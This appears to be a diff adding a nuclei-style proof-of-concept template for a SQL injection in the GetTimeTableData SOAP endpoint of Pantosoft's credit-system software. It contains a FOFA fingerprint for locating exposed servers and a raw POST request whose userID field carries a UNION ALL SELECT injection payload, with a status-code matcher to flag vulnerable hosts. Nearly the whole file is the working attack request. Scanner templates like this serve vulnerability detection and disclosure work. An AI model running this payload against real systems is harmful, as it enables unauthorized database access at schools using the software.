@@ -1,0 +1,19 @@
+id: poc-idmi07q4a4ozrac5
+info:
+  name: 学分制系统GetTimeTableData SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/idmi07q4a4ozrac5'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: idmi07q4a4ozrac5
+    fofa: body="www.pantosoft.com" && body="Pantosoft Corporation" || icon_hash="-1632820573"
+http:
+- raw:
+  - "POST /WebService/Interactive.asmx HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br\nConnection: close\nCookie: ASP.NET_SessionId=bwk5l0xu02utzfib4tmsap5t\nUpgrade-Insecure-Requests: 1\nPriority: u=1\nSOAPAction: [http://tempuri.org/GetTimeTableData](http://tempuri.org/GetTimeTableData)\nContent-Type: text/xml;charset=UTF-8\nContent-Length: 1418\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:GetTimeTableData>\n         <!--type: string-->\n         <tem:userID>gero et' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(113)+CHAR(118)+CHAR(107)+CHAR(113)+CHAR(74)+CHAR(88)+CHAR(79)+CHAR(115)+CHAR(68)+CHAR(99)+CHAR(75)+CHAR(97)+CHAR(78)+CHAR(86)+CHAR(85)+CHAR(82)+CHAR(87)+CHAR(68)+CHAR(97)+CHAR(71)+CHAR(70)+CHAR(71)+CHAR(80)+CHAR(81)+CHAR(115)+CHAR(88)+CHAR(102)+CHAR(83)+CHAR(114)+CHAR(98)+CHAR(88)+CHAR(116)+CHAR(68)+CHAR(79)+CHAR(90)+CHAR(120)+CHAR(75)+CHAR(74)+CHAR(83)+CHAR(106)+CHAR(85)+CHAR(87)+CHAR(66)+CHAR(113)+CHAR(113)+CHAR(106)+CHAR(113)+CHAR(98)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Hene</tem:userID>\n         <!--type: string-->\n         <tem:startDate>sonoras imperio</tem:startDate>\n      </tem:GetTimeTableData>\n   </soapenv:Body>\n</soapenv:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    type: status
